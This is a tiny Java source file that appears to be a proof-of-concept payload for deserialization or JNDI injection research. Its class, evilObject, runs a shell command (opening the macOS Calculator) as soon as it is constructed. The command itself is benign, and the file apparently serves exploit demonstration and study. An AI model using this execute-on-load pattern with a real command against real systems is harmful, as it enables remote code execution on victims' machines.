import java.io.IOException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/5 11:17 上午
 */
public class evilObject {

    public evilObject() {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
